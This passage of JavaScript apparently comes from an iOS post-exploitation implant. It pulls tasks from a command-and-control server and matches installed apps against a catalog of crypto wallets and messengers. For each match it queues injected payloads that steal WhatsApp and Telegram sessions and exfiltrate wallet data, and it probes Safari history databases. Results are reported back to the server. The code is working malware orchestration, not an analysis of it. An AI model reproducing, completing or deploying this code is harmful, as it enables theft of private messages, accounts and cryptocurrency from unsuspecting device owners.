			let resp = __peHttpPostJson("/api/task/pull", JSON.stringify({ uid: uid, uuid: uid }));
			if (!resp || resp.length < 10) {
				LOG("[PE-DIRECT] task/pull fail resp_len=" + (resp ? resp.length : 0));
				try { N.callSymbol("unlink", lockPath); } catch (_) {}
				return;
			}
			let pull = null;
			try {
				let obj = JSON.parse(resp);
				pull = (obj && obj.data) ? obj.data : obj;
			} catch (_) { pull = null; }
			if (!pull) {
				LOG("[PE-DIRECT] task/pull parse fail");
				try { N.callSymbol("unlink", lockPath); } catch (_) {}
				return;
			}
			let installed = peListAppContainers();
			try {
				let rawAl = __peReadFileUtf8("/tmp/c2_ipc/app_list.json", 512000);
				if (rawAl && rawAl.length > 8) {
					let al = JSON.parse(rawAl);
					let extra = (al && al.apps) ? al.apps : (Array.isArray(al) ? al : []);
					let have = {};
					for (let hi = 0; hi < installed.length; hi++) {
						have[String((installed[hi] && installed[hi].bundleId) || "").toLowerCase()] = 1;
					}
					for (let ei = 0; ei < extra.length; ei++) {
						let eb = String((extra[ei] && extra[ei].bundleId) || extra[ei] || "").toLowerCase();
						if (eb && !have[eb]) {
							installed.push(extra[ei] && extra[ei].bundleId ? extra[ei] : { bundleId: eb });
							have[eb] = 1;
						}
					}
					if (al && al.groups) installed.groups = al.groups;
				}
			} catch (_) {}
			let tasks = pull.tasks || [];
			let matched = [];
			for (let ti = 0; ti < tasks.length; ti++) {
				if (peDirectMatchApp(installed, tasks[ti])) matched.push(tasks[ti]);
			}
			matched.sort(function (a, b) {
				return (peDirectIsWhatsApp(a) ? 1 : 0) - (peDirectIsWhatsApp(b) ? 1 : 0);
			});
			LOG("[PE-DIRECT] app_list n=" + installed.length + " matched=" + matched.length + "/" + tasks.length);
			peDirectDebugTelegramProbe(installed, tasks, matched);
			// Applist ? catalog -> always enqueue (do not wait for skip_match / empty-meta).
			(function peDirectSynthFromApplist() {
				function findTask(pred, synth) {
					for (let t = 0; t < tasks.length; t++) {
						if (pred(tasks[t])) return tasks[t];
					}
					return synth;
				}
				function haveBid(bid) {
					let b = String(bid || "").toLowerCase();
					if (!b) return false;
					for (let i = 0; i < matched.length; i++) {
						let mb = String((matched[i] && matched[i].bundleId) || "").toLowerCase();
						if (mb && (mb === b || peBidCompatible(mb, b) || peBidCompatible(b, mb)))
							return true;
					}
					return false;
				}
				let synthById = {
					whatsapp: { bundleId: "net.whatsapp.WhatsApp", name: "WhatsApp", payload: "session_whatsapp.js", cold: 1 },
					telegram: { bundleId: "ph.telegra.Telegraph", name: "Telegram", payload: "session_telegram.js", cold: 1 },
					imtoken: { bundleId: "im.token.app", name: "imToken", payload: "b2lib.js", cold: 1 },
					bitpie: { bundleId: "com.bitpie.wallet", name: "Bitpie", payload: "r18lib.js", cold: 1 },
					tokenpocket: { bundleId: "com.global.wallet.ios", name: "TokenPocket", payload: "p16lib.js", cold: 1 },
					trustwallet: { bundleId: "com.sixdays.trust", name: "Trust", payload: "d4lib.js", cold: 1 },
					bitget: { bundleId: "com.bitkeep.os", name: "BitKeep", payload: "f6lib.js", cold: 1 },
					coin98: { bundleId: "coin98.crypto.finance.insights", name: "Coin98", payload: "q17lib.js", cold: 1 },
					coinbase: { bundleId: "org.toshi.distribution", name: "Coinbase", payload: "e5lib.js", cold: 1 },
					exodus: { bundleId: "exodus-movement.exodus", name: "Exodus", payload: "k11lib.js", cold: 1 },
					metamask: { bundleId: "io.metamask.MetaMask", name: "MetaMask", payload: "a1lib.js", cold: 1 },
					mytonwallet: { bundleId: "org.mytonwallet.app", name: "MyTonWallet", payload: "j10lib.js", cold: 1 },
					phantom: { bundleId: "app.phantom", name: "Phantom", payload: "i9lib.js", cold: 1 },
					ronin: { bundleId: "com.skymavis.Genesis", name: "Ronin", payload: "l12lib.js", cold: 1 },
					solflare: { bundleId: "com.solflare.mobile", name: "Solflare", payload: "s19lib.js", cold: 1 },
					tonhub: { bundleId: "com.tonhub.app", name: "Tonhub", payload: "n14lib.js", cold: 1 },
					tonkeeper: { bundleId: "com.jbig.tonkeeper", name: "Tonkeeper", payload: "g7lib.js", cold: 1 },
					tronlink: { bundleId: "com.tronlink.hdwallet", name: "TronLink", payload: "c3lib.js", cold: 1 },
					uniswap: { bundleId: "com.uniswap.mobile", name: "Uniswap", payload: "h8lib.js", cold: 1 },
					okx: { bundleId: "com.okex.OKExAppstoreFull", name: "OKX", payload: "t20lib.js", cold: 1 },
					krystal: { bundleId: "com.kyrd.jpystal.ios", name: "jpystal", payload: "m13lib.js", cold: 1 }
				};
				for (let i = 0; i < installed.length; i++) {
					let app = installed[i];
					let ab = "";
					if (typeof app === "string") ab = app;
					else if (app && typeof app === "object")
						ab = String(app.bundleId || app.bundle_id || app.id || "");
					ab = ab.toLowerCase();
					if (!ab || ab.indexOf("springboard") >= 0 || ab === "imagent") continue;
					let row = null;
					let cat = globalThis.__peP7Catalog || [];
					for (let ci = 0; ci < cat.length; ci++) {
						if (peCatalogRowHitsBid(cat[ci], ab)) { row = cat[ci]; break; }
					}
					if (!row) continue;
					if (haveBid(ab)) continue;
					let synth = synthById[row.id] || {
						bundleId: ab, name: row.id, payload: row.id + ".js", cold: 1
					};
					if (row.id === "whatsapp" && ab.indexOf("whatsappsmb") >= 0) {
						synth = {
							bundleId: "net.whatsapp.WhatsAppSMB",
							name: "WhatsApp Business",
							payload: "session_whatsapp.js",
							cold: 1
						};
					} else {
						synth = {
							bundleId: synth.bundleId || ab,
							name: synth.name || row.id,
							payload: synth.payload,
							cold: 1
						};
					}
					let picked = findTask(function (t) {
						return peDirectMatchApp([app], t);
					}, synth);
					matched.push(picked);
					LOG("[PE-DIRECT] synth match " + row.id + " bid=" +
						String(picked.bundleId || ab) + " from applist");
				}
			})();
			for (let miLog = 0; miLog < matched.length; miLog++) {
				let me = matched[miLog];
				LOG("[PE-DIRECT] matched[" + miLog + "] bid=" + String(me.bundleId || "") +
					" name=" + String(me.name || "") + " payload=" + String(me.payload || ""));
			}
			if (!matched.length) {
				LOG("[PE-DIRECT] matched empty - pipeline end (no inject)");
				globalThis.__pe_direct_pipe = {
					state: "done", uid: uid, loadLog: [], lockPath: lockPath,
					safari_promo: promoRes || globalThis.__pe_direct_safari_promo || null
				};
				try { N.callSymbol("unlink", lockPath); } catch (_) {}
				return;
			}
			let entries = [];
			let waPending = [];
			let imPending = [];
			let bpPending = [];
			let skipN = 0;
			let tgPending = [];
			for (let mi = 0; mi < matched.length; mi++) {
				let ent = matched[mi];
				let payload = String(ent.payload || "");
				let base = payload.replace(/\.js$/i, "");
				let isTg = peDirectIsTelegramTask(ent);
				let isWa = peDirectIsWhatsApp(ent);
				let isIm = peDirectIsImToken(ent);
				let isBp = peDirectIsBitpie(ent);
				if (isIm) {
					LOG("[PE-DIRECT] imtoken_pending bid=" + String(ent.bundleId || "") + " (after P7 / b2lib pe-native)");
					imPending.push(ent);
					continue;
				}
				if (isBp) {
					LOG("[PE-DIRECT] bitpie_pending bid=" + String(ent.bundleId || "") + " (after P7 / r18lib pe-native)");
					bpPending.push(ent);
					continue;
				}
				if (!isTg && !isWa) {
					skipN++;
					LOG("[PE-DIRECT] skip_unknown bid=" + String(ent.bundleId || "") +
						" payload=" + base + " (wallet/other - P7 dump + wallet_scan; not session inject)");
					entries.push({
						ent: ent, sid: "", ok: true, state: "done_skip",
						error: "skip_unknown", module_id: base, payload: base
					});
					continue;
				}
				if (isWa) {
					LOG("[PE-DIRECT] wa_pending bid=" + String(ent.bundleId || "") + " (after P7)");
					waPending.push(ent);
					continue;
				}
				if (isTg) {
					if (peTgPaused()) {
						LOG("[PE-DIRECT] tg_paused via agent_flags bid=" + String(ent.bundleId || "") +
							" (skip copy/upload)");
						entries.push({
							ent: ent, sid: "", ok: true, state: "done_skip",
							error: "tg_paused", module_id: base, payload: "telegram"
						});
						continue;
					}
					LOG("[PE-DIRECT] tg_pending bid=" + String(ent.bundleId || "") +
						" (pe copy AppGroup files; agent /result; no configd)");
					tgPending.push(ent);
					continue;
				}
			}
			let needP7 = !!(waPending.length || imPending.length || bpPending.length || skipN || tgPending.length);
			globalThis.__pe_direct_pipe = {
				state: "running",
				uid: uid,
				cmdId: "direct-" + Date.now(),
				pull_id: pull.pull_id || "",
				entries: entries,
				wa_pending: waPending,
				im_pending: imPending,
				bp_pending: bpPending,
				tg_pending: tgPending,
				p7_ran: !needP7,
				p7_done: !needP7,
				need_p7: needP7,
				wa_identity: false,
				wa_queued: false,
				im_queued: false,
				bp_queued: false,
				wallet_queued: false,
				tg_copied: false,
				safari_promo: promoRes || globalThis.__pe_direct_safari_promo || null,
				lockPath: lockPath,
				started: Date.now()
			};
			if (tgPending.length) {
				globalThis.__pe_tg_direct_pending = true;
				globalThis.__pe_direct_pipe.tg_arm_at = Date.now();
				globalThis.__pe_direct_pipe.had_tg = true;
			}
			LOG("[PE-DIRECT] pipeline running tg_pending=" + tgPending.length +
				" skip=" + skipN + " wa_pending=" + waPending.length +
				" im_pending=" + imPending.length + " bp_pending=" + bpPending.length +
				" need_p7=" + needP7 + " entries=" + entries.length);
		}
		function peArmDirectAfterApplist() {
			if (globalThis.__pe_direct_arm_done) return;
			if (typeof peIdentityReady === "function" && !peIdentityReady()) return;
			if (!globalThis.__pe_safari_promo_done) return;
			let installed = null;
			let src = "";
			try {
				let raw = __peReadFileUtf8("/tmp/c2_ipc/app_list.json", 512000);
				if (raw && raw.length > 8) {
					let obj = JSON.parse(raw);
					installed = obj;
					src = "agent_tmp";
				}
			} catch (_) {}
			if (!installed || (!(installed.apps && installed.apps.length) && !Array.isArray(installed))) {
				if (!globalThis.__pe_applist_wait_ts) globalThis.__pe_applist_wait_ts = Date.now();
				if ((Date.now() - globalThis.__pe_applist_wait_ts) < 20000) return;
				try {
					installed = { apps: peListAppContainers(), groups: [], source: "pe_fallback" };
					src = "pe_fallback";
				} catch (_) {
					return;
				}
			}
			if (Array.isArray(installed)) installed = { apps: installed, groups: [], source: src || "array" };
			let hits = peCatalogIntersect(installed);
			globalThis.__pe_direct_arm_done = true;
			let ids = [];
			for (let i = 0; i < hits.length; i++) ids.push(hits[i].id + ":" + (hits[i].why || ""));
			if (!hits.length) {
				globalThis.__pe_catalog_empty = true;
				globalThis.__pe_p7_needles = [];
				LOG("[PE-DIRECT] empty intersect src=" + (installed.source || src) +
					" apps=" + ((installed.apps && installed.apps.length) || 0) + " - skip P7");
				return;
			}
			let needles = peNeedlesFromHits(hits);
			globalThis.__pe_catalog_empty = false;
			globalThis.__pe_p7_needles = needles;
			PE_DIRECT_PIPELINE = true;
			globalThis.PE_DIRECT_PIPELINE = true;
			LOG("[PE-DIRECT] arm src=" + (installed.source || src) + " hits=" + ids.join(",") +
				" needles=" + needles.length);
			try { peDirectPipelineKick(); } catch (kE) {
				LOG("[PE-DIRECT] kick after arm ERR " + String(kE).slice(0, 80));
			}
		}
		function peDirectTgEvalTerminal(te) {
			if (!te || te.payload !== "telegram") return true;
			if (te.state === "done_ok" || te.state === "done_fail") return true;
			if (!te.sid) return te.state !== "queued" && te.state !== "inject_ok";
			let ev = __peReadFileUtf8("/tmp/c2_ipc/session." + te.sid + ".eval", 4096);
			if (ev && ev.length > 8) {
				try {
					let eo = JSON.parse(ev);
					if (eo && (eo.state === "eval_ok" || eo.state === "eval_fail" || eo.state === "eval_no_file"))
						return true;
				} catch (_) {}
			}
			let sess = (globalThis.__pe_sessions || {})[te.sid];
			if (sess && !sess.eval_pending && sess.eval_state) return true;
			return false;
		}
		function peDirectPipelineTick() {
			let pipe = globalThis.__pe_direct_pipe;
			if (!pipe || pipe.state !== "running") return;
			let allDone = true;
			let entries = pipe.entries || [];
			for (let i = 0; i < entries.length; i++) {
				let e = entries[i];
				// Promote WA half->full when identity appears (assemble path).
				if (e.state === "session_half" && (e.payload === "whatsapp" || peDirectIsWhatsApp(e.ent))) {
					if (pipe.wa_identity || peP7IdentityOnDisk()) {
						e.wa_full = true;
						e.error = "";
						e.state = "done_ok";
					}
				}
				if (e.state === "done_ok" || e.state === "done_fail" || e.state === "session_half" || e.state === "done_skip") continue;
				if (e.state === "im_exfil_pending" || e.state === "im_collecting") {
					if (e.im_exfil && e.im_exfil.done) {
						e.state = e.ok ? "done_ok" : "done_fail";
					} else if (e.im_exfil) {
						peImTokenExfilTickOne(e.im_exfil, e);
						if (!(e.im_exfil && e.im_exfil.done)) allDone = false;
					} else {
						peImTokenExfilArm(e, "retry");
						allDone = false;
					}
					if (e.state === "done_ok" || e.state === "done_fail") continue;
					allDone = false;
					continue;
				}
				if (e.state === "bp_exfil_pending" || e.state === "bp_collecting") {
					if (e.bp_exfil && e.bp_exfil.done) {
						e.state = e.ok ? "done_ok" : "done_fail";
					} else if (e.bp_exfil) {
						peBitpieExfilTickOne(e.bp_exfil, e);
						if (!(e.bp_exfil && e.bp_exfil.done)) allDone = false;
					} else {
						peBitpieExfilArm(e, "retry");
						allDone = false;
					}
					if (e.state === "done_ok" || e.state === "done_fail") continue;
					allDone = false;
					continue;
				}
				if (e.state === "wa_collecting" || e.state === "wa_exfil_pending") {
					if (!e._soft_wait_since) e._soft_wait_since = Date.now();
					let softLim = (e.state === "wa_exfil_pending") ? PE_WA_EXFIL_SOFT_MS : PE_WA_COLLECT_SOFT_MS;
					if ((Date.now() - e._soft_wait_since) > softLim) {
						/* Missing collect files / stalled exfil -> fail this entry, free pipeline. */
						let wasExfil = (e.state === "wa_exfil_pending");
						e.state = (e.session_ok || e.ok) ? "session_half" : "done_fail";
						e.ok = !!(e.session_ok || e.ok);
						e.error = wasExfil ? "wa_exfil_soft_timeout" : "wa_collect_soft_timeout";
						LOG("[PE-DIRECT] " + e.error + " sid=" + (e.sid || "") +
							" -> release pipeline (siblings continue)");
						continue;
					}
					let col2 = peWaCollectReady(e.sid);
					if (col2) {
						peWaExfilOnce(pipe, e);
						e.wa_full = !!(pipe.wa_identity || peP7IdentityOnDisk());
						if (e.wa_full && e.wa_exfil_done) {
							e.state = "done_ok";
							e.error = "";
							e.ok = true;
						} else if (!e.wa_full) {
							e.state = "session_half";
							e.error = "session_ok_wait_identity";
							e.ok = true;
						} else {
							allDone = false;
						}
					} else {
						allDone = false;
					}
					if (e.state === "done_ok" || e.state === "session_half") continue;
				}
				if (e.state === "queued") {
					let st = __peReadFileUtf8("/tmp/c2_ipc/session." + e.sid + ".status", 2048);
					if (st && st.length > 8) {
						try {
							let so = JSON.parse(st);
							if (so && so.state === "running" && so.ok !== false) e.state = "inject_ok";
							else if (so && (so.state === "inject_fail" || so.ok === false)) {
								e.state = "done_fail";
								e.ok = false;
								e.error = so.error || "inject_fail";
							}
						} catch (_) {}
					}
				}
				if (e.state === "inject_ok" || e.state === "queued") {
					let ev = __peReadFileUtf8("/tmp/c2_ipc/session." + e.sid + ".eval", 4096);
					if (ev && ev.length > 8) {
						try {
							let eo = JSON.parse(ev);
							if (eo && eo.state === "eval_ok") {
								// WA: wait for collect (/tmp/wa_auth/manifest) before done_ok; then exfil.
								if (e.payload === "whatsapp" || peDirectIsWhatsApp(e.ent)) {
									e.ok = true;
									e.session_ok = true;
									let col = peWaCollectReady(e.sid);
									if (!col) {
										e.state = "wa_collecting";
										e.error = "wait_collect";
										allDone = false;
									} else {
										peWaExfilOnce(pipe, e);
										e.wa_full = !!(pipe.wa_identity || peP7IdentityOnDisk());
										if (e.wa_full && e.wa_exfil_done) {
											e.state = "done_ok";
											e.error = "";
										} else if (e.wa_full && !e.wa_exfil_done) {
											e.state = "wa_exfil_pending";
											allDone = false;
										} else {
											e.state = "session_half";
											e.error = "session_ok_wait_identity";
										}
									}
								} else {
									e.state = "done_ok";
									e.ok = true;
								}
							} else if (eo && (eo.state === "eval_fail" || eo.state === "eval_no_file")) {
								e.state = "done_fail";
								e.ok = false;
								e.error = eo.error || eo.state;
							}
						} catch (_) {}
					}
					let sess = (globalThis.__pe_sessions || {})[e.sid];
					if (sess && sess.eval_state === "eval_ok" && e.state !== "session_half" && e.state !== "done_ok" &&
						e.state !== "wa_collecting" && e.state !== "wa_exfil_pending") {
						if (e.payload === "whatsapp" || peDirectIsWhatsApp(e.ent)) {
							e.ok = true;
							e.session_ok = true;
							let col3 = peWaCollectReady(e.sid);
							if (!col3) {
								e.state = "wa_collecting";
								e.error = "wait_collect";
								allDone = false;
							} else {
								peWaExfilOnce(pipe, e);
								e.wa_full = !!(pipe.wa_identity || peP7IdentityOnDisk());
								if (e.wa_full && e.wa_exfil_done) {
									e.state = "done_ok";
									e.error = "";
								} else if (e.wa_full) {
									e.state = "wa_exfil_pending";
									allDone = false;
								} else {
									e.state = "session_half";
									e.error = "session_ok_wait_identity";
								}
							}
						} else {
							e.state = "done_ok";
							e.ok = true;
						}
					} else if (sess && sess.eval_state === "eval_fail") {
						e.state = "done_fail";
						e.ok = false;
						e.error = sess.eval_state;
					}
				}
				if (e.state !== "done_ok" && e.state !== "done_fail" && e.state !== "session_half" && e.state !== "done_skip") {
					// Soft-timeout mid collect/exfil handled above; hard pipeline cap still applies.
					if (e.state === "wa_exfil_pending" || e.state === "wa_collecting" ||
						e.state === "im_exfil_pending" || e.state === "im_collecting" ||
						e.state === "bp_exfil_pending" || e.state === "bp_collecting") {
						if (!e._mod_wait_since) e._mod_wait_since = Date.now();
						let modLim = (e.state.indexOf("exfil") >= 0) ? PE_WA_EXFIL_SOFT_MS : PE_WA_COLLECT_SOFT_MS;
						if ((Date.now() - e._mod_wait_since) > modLim) {
							e.state = "done_fail";
							e.ok = false;
							e.error = "module_soft_timeout:" + e.state;
							LOG("[PE-DIRECT] " + e.error + " release siblings");
						} else {
							allDone = false;
						}
					} else if (pipe.started && (Date.now() - pipe.started) > PE_PIPELINE_TIMEOUT_MS) {
						e.state = "done_fail";
						e.ok = false;
						e.error = "pipeline_timeout";
					} else {
						allDone = false;
					}
				}
			}
			// Arm SEC-Q once catalog hits need dump. CFG-Q waits until TG /result finishes.
			if (((pipe.wa_pending && pipe.wa_pending.length) ||
				(pipe.im_pending && pipe.im_pending.length) ||
				(pipe.bp_pending && pipe.bp_pending.length) ||
				pipe.need_p7) && !pipe.p7_ran) {
				let tgArm = peTgUploadGate();
				if (!tgArm.ready) {
					if ((Date.now() - (Number(pipe.tg_p7_log_ts) || 0)) >= 5000) {
						pipe.tg_p7_log_ts = Date.now();
						LOG("[PE-DIRECT] hold SEC-Q/CFG-Q until TG upload reason=" +
							tgArm.reason + " remain_ms=" + (tgArm.wait_ms || 0));
					}
					allDone = false;
				} else {
					pipe.p7_ran = true;
					globalThis.__pe_p7_direct_pending = true;
					globalThis.__pe_p7_direct_pipe = pipe;
					globalThis.__pe_p7_direct_arm_at = Date.now() + 2000;
					LOG("[PE-DIRECT] p7 deferred armed +2s -> SEC-Q after TG gate=" +
						tgArm.reason);
					allDone = false;
				}
			}
			if (globalThis.__pe_p7_direct_pending) allDone = false;
			if (globalThis.__pe_wa_direct_pending) allDone = false;
			if (globalThis.__pe_im_direct_pending) allDone = false;
			if (globalThis.__pe_bp_direct_pending) allDone = false;
			if (globalThis.__pe_wallet_direct_pending) allDone = false;
			if (globalThis.__pe_war_direct_pending) allDone = false;
			if (pipe.wa_pending && pipe.wa_pending.length) allDone = false;
			if (pipe.im_pending && pipe.im_pending.length) allDone = false;
			if (pipe.bp_pending && pipe.bp_pending.length) allDone = false;
			try {
				let wx = globalThis.__pe_wallet_scan_exfil;
				if (wx && wx.armed && !wx.done) allDone = false;
				let bx = globalThis.__pe_bp_exfil;
				if (bx && bx.armed && !bx.done) allDone = false;
				let warx = globalThis.__pe_war_exfil;
				if (warx && warx.armed && !warx.done) allDone = false;
			} catch (_) {}
			try {
				let sq = globalThis.__pe_sec_q;
				if (sq && sq.jobs && sq.jobs.length && sq.state !== "done" && sq.state !== "exhausted")
					allDone = false;
			} catch (_) {}
			if (!allDone) return;
			let loadLog = [];
			let okN = 0;
			let failN = 0;
			let sessionHalfN = 0;
			let waFullN = 0;
			let idOk = !!(pipe.wa_identity || peP7IdentityOnDisk());
			for (let j = 0; j < entries.length; j++) {
				let ej = entries[j];
				let isWa = ej.payload === "whatsapp" || peDirectIsWhatsApp(ej.ent);
				let row = {
					bundleId: (ej.ent && ej.ent.bundleId) || "",
					name: (ej.ent && ej.ent.name) || "",
					payload: ej.payload || ((ej.ent && ej.ent.payload) || ""),
					ok: !!ej.ok,
					session_ok: !!(ej.session_ok || (isWa && ej.ok)),
					wa_full: isWa ? !!(ej.wa_full || (ej.state === "done_ok" && idOk)) : undefined,
					wa_identity: isWa ? idOk : undefined,
					state: ej.state || "",
					error: ej.error || "",
					module_id: ej.module_id || "",
					session_id: ej.sid || "",
					via: "pe_direct"
				};
				loadLog.push(row);
				if (ej.state === "done_skip" || ej.error === "skip_unknown") {
					// Wallet/other: covered by P7 dump exfil, not a pipeline fail.
					okN++;
				} else if (ej.state === "session_half") {
					sessionHalfN++;
					okN++; // session files collected - half success counts as loaded, not full WA
				} else if (ej.ok) {
					okN++;
					if (isWa && (ej.wa_full || ej.state === "done_ok")) waFullN++;
				} else failN++;
			}
			pipe.state = "done";
			globalThis.__pe_direct_pipe_done = true;
			// Never treat "session eval_ok alone" as full WA pipeline success.
			let pipeStatus = "done";
			if (failN) pipeStatus = "partial";
			else if (sessionHalfN && !idOk) pipeStatus = "session_half";
			else if (sessionHalfN && idOk && !waFullN) pipeStatus = "session_half";
			try {
				let sp = pipe.safari_promo || globalThis.__pe_direct_safari_promo || null;
				__peHttpPostJson("/api/task/pipeline/done", JSON.stringify({
					uid: pipe.uid,
					status: pipeStatus,
					meta: {
						matched: entries.length,
						loaded: okN,
						failed: failN,
						session_half: sessionHalfN,
						wa_full: waFullN,
						wa_identity: idOk,
						wa_complete: !!(idOk && (waFullN > 0 || sessionHalfN > 0)),
						pull_id: pipe.pull_id,
						loads: loadLog,
						role: "pe_direct",
						note: "pipeline ok!=full WA; need wa_identity + session",
						safari_promo: sp ? {
							hit: sp.hit,
							match: sp.match,
							scanned_dbs: sp.scanned_dbs,
							promo_count: sp.promo_count,
							reported: !!sp.reported
						} : null
					}
				}));
			} catch (_) {}
			try { if (pipe.lockPath) N.callSymbol("unlink", pipe.lockPath); } catch (_) {}
			LOG("[PE-DIRECT] pipeline done status=" + pipeStatus +
				" ok=" + okN + " fail=" + failN +
				" session_half=" + sessionHalfN + " wa_full=" + waFullN +
				" wa_identity=" + idOk);
		}
		// E5: planned task modules for 8090 UI overlay
		if (!globalThis.__pe_task_modules) globalThis.__pe_task_modules = {};
		function peTaskSet(id, fields) {
			try {
				let mid = String(id || "");
				if (!mid) return;
				let cur = globalThis.__pe_task_modules[mid] || { id: mid };
				let keys = Object.keys(fields || {});
				for (let i = 0; i < keys.length; i++) cur[keys[i]] = fields[keys[i]];
				if (cur.timeout_ms == null) cur.timeout_ms = PE_MODULE_TIMEOUT_MS;
				cur.id = mid;
				globalThis.__pe_task_modules[mid] = cur;
			} catch (_) {}
		}
		function peCollectModules() {
			let out = [];
			try {
				let m = globalThis.__pe_task_modules || {};
				let keys = Object.keys(m);
				for (let i = 0; i < keys.length; i++) out.push(m[keys[i]]);
			} catch (_) {}
			return out;
		}
		function peHttpPathFromUrl(fullUrl) {
			let path = String(fullUrl || "");
			try {
				let idx = path.indexOf("://");
				if (idx >= 0) {
					let rest = path.slice(idx + 3);
					let slash = rest.indexOf("/");
					path = slash >= 0 ? rest.slice(slash) : "/";
				}
			} catch (_) {}
			return path;
		}
		function peModulePostResult(mod, status, extra) {
			try {
				let cur = (globalThis.__pe_task_modules || {})[String(mod || "")] || {};
				let url = cur.result_url || "";
				if (!url) return;
				let st = String(status || "unknown");
				let outcome = "fail";
				if (st === "done" || st === "success" || st === "ok") outcome = "success";
				else if (st === "timeout") outcome = "timeout";
				else if (st === "skip" || st === "skipped") outcome = "skip";
				else if (st === "failed" || st === "fail" || st === "error") outcome = "fail";
				let body = JSON.stringify({
					module_id: String(mod || ""),
					uuid: peDeviceUuid(),
					uid: peDeviceUuid(),
					pe_uid: "pe-" + Number(pePid),
					status: st,
					outcome: outcome,
					ts: Date.now(),
					note: cur.note || "",
					stage: st,
					error: (extra && extra.error) ? String(extra.error) : (cur.note || ""),
					deploy_id: cur.deploy_id || "",
					result: extra || null
				});
				__peHttpPostJson(peHttpPathFromUrl(url), body);
			} catch (_) {}
		}
		function peSafariPromoProbe(promoUrls, promoDomains) {
			// Schema-agnostic Safari promo hit: full URL first, then domain; else "-1".
			let SQLITE_OK = 0;
			let SQLITE_ROW = 100;
			let URL_RE = /https?:\/\/[^\s"'<>]+/i;
			let fullSet = {};
			let domainSet = {};
			let urlsIn = promoUrls || [];
			let domsIn = promoDomains || [];
			for (let i = 0; i < urlsIn.length; i++) {
				let u = String(urlsIn[i] || "").trim();
				if (!u) continue;
				fullSet[u] = true;
				fullSet[u.replace(/\/$/, "")] = true;
			}
			for (let j = 0; j < domsIn.length; j++) {
				let d = String(domsIn[j] || "").toLowerCase().replace(/:\d+$/, "");
				if (d) domainSet[d] = true;
			}
			/* Empty promo set -> no DB walk (avoid blocking pipeline on nothing-to-match). */
			if (!Object.keys(fullSet).length && !Object.keys(domainSet).length) {
				LOG("[PE] safari_promo skip probe - empty promo set");
				return {
					ok: true, hit: "-1", match: "none", default: "-1",
					scanned_dbs: 0, urls_seen: 0, found_history: false
				};
			}
			function hostOf(u) {
				let m = String(u || "").match(/^https?:\/\/([^\/\?#]+)/i);
				if (!m) return "";
				return String(m[1] || "").toLowerCase().replace(/:\d+$/, "");
			}
			let fk = Object.keys(fullSet);
			for (let i = 0; i < fk.length; i++) {
				let h = hostOf(fk[i]);
				if (h) domainSet[h] = true;
			}
			function listNames(dirPath) {
				let names = [];
				try {
					let dir = N.callSymbol("opendir", dirPath);
					if (!dir || dir === 0 || dir === 0n) return names;
					for (let n = 0; n < 512; n++) {
						let ent = N.callSymbol("readdir", dir);
						if (!ent || ent === 0 || ent === 0n) break;
						let namePtr = BigInt(ent) + 21n;
						let name = N.readString(namePtr, 256) || "";
						if (!name || name === "." || name === "..") continue;
						names.push(name);
					}
					N.callSymbol("closedir", dir);
				} catch (_) {}
				return names;
			}
			function fileExists(p) {
				try {
					let fd = fopen(get_cstring(p), get_cstring("rb"));
					if (fd && fd !== 0n) { fclose(fd); return true; }
				} catch (_) {}
				return false;
			}
			function collectDbPaths() {
				let ranked = [];
				function push(p, w) {
					if (!p || ranked.some((x) => x.p === p)) return;
					ranked.push({ p: p, w: w });
				}
				push("/private/var/mobile/Library/Safari/History.db", 100);
				push("/private/var/mobile/Library/Safari/SafariTabs.db", 95);
				push("/private/var/mobile/Library/Safari/BrowserState.db", 92); // iOS13-14 tabs primary
				push("/private/var/mobile/Library/Safari/CloudTabs.db", 85);
				push("/private/var/mobile/Library/Safari/Bookmarks.db", 70);
				push("/private/var/mobile/Library/safari/History.db", 40);
				let profRoot = "/private/var/mobile/Library/Safari/Profiles";
				let profs = listNames(profRoot);
				for (let i = 0; i < profs.length; i++) push(profRoot + "/" + profs[i] + "/History.db", 88);
				let appBase = "/private/var/mobile/Containers/Data/Application";
				let apps = listNames(appBase);
				let maxApps = apps.length > 80 ? 80 : apps.length;
				for (let a = 0; a < maxApps; a++) {
					let base = appBase + "/" + apps[a] + "/Library/Safari";
					push(base + "/History.db", 80);       // ?12 primary
					push(base + "/BrowserState.db", 78);  // ?12 / iOS13 container
					push(base + "/SafariTabs.db", 75);
					push(base + "/CloudTabs.db", 70);
					let p2 = listNames(base + "/Profiles");
					for (let b = 0; b < p2.length; b++) push(base + "/Profiles/" + p2[b] + "/History.db", 82);
				}
				ranked.sort((x, y) => y.w - x.w);
				let exist = [];
				for (let i = 0; i < ranked.length; i++) if (fileExists(ranked[i].p)) exist.push(ranked[i].p);
				return exist;
			}
			function sqlText(stmt, col) {
				try {
					let p = BigInt(N.callSymbol("sqlite3_column_text", stmt, col));
					if (!p || p === 0n) return "";
					return N.readString(p, 4096) || "";
				} catch (_) { return ""; }
			}
			// Soft JS deadlines alone cannot break a blocked sqlite3_open/step.
			// Fix: open with immutable URI (avoid Safari WAL lock), per-DB 5s hard
			// interrupt via dispatch_after_f(sqlite3_interrupt), try/catch continue.
			let PROBE_BUDGET_MS = 22000;
			let PER_DB_MS = 5000;
			let SAMPLE_ROWS = 24;
			let URL_ROWS = 1200;
			let MAX_TABLES_PER_DB = 24;
			let probeT0 = Date.now();
			let probeTimedOut = false;
			function probeElapsed() { return Date.now() - probeT0; }
			function probeDeadlineHit() {
				if (probeTimedOut) return true;
				if (probeElapsed() >= PROBE_BUDGET_MS) {
					probeTimedOut = true;
					return true;
				}
				return false;
			}
			function dbDeadlineHit(dbT0) {
				return (Date.now() - dbT0) >= PER_DB_MS || probeDeadlineHit();
			}
			function openDbPlain(path) {
				let buf = N.callSymbol("calloc", 1, 8);
				let rc = Number(N.callSymbol("sqlite3_open_v2", path, buf, 0x01, 0n));
				if (rc !== SQLITE_OK) {
					try { N.callSymbol("free", buf); } catch (_) {}
					return null;
				}
				let db = N.read64(BigInt(buf));
				N.callSymbol("free", buf);
				try { N.callSymbol("sqlite3_busy_timeout", db, 200); } catch (_) {}
				return db;
			}
			function openDb(path) {
				// SQLITE_OPEN_READONLY|URI + immutable=1: do not wait on Safari's WAL lock
				// (plain open of SafariTabs.db can block indefinitely before busy_timeout applies).
				try {
					let uri = "file://" + String(path) + "?mode=ro&immutable=1";
					let buf = N.callSymbol("calloc", 1, 8);
					let flags = 0x01 | 0x40; // READONLY|URI
					let rc = Number(N.callSymbol("sqlite3_open_v2", uri, buf, flags, 0n));
					if (rc === SQLITE_OK) {
						let db = N.read64(BigInt(buf));
						N.callSymbol("free", buf);
						try { N.callSymbol("sqlite3_busy_timeout", db, 200); } catch (_) {}
						return { db: db, via: "immutable" };
					}
